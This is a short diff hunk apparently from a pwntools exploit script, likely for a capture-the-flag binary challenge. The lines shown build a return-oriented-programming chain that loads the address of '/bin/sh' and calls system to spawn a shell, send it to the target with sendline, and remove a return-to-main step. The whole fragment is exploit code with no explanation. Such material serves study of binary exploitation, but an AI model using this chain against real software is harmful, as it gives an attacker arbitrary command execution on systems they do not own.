@@ -47,7 +47,6 @@ p += p64(pop_r12)
 p += p64(pop_rdi)
 p += p64(ADDR_BINSH)
 p += p64(ADDR_SYSTEM)
-p += p64(main)
 
 r.sendline(p)
 
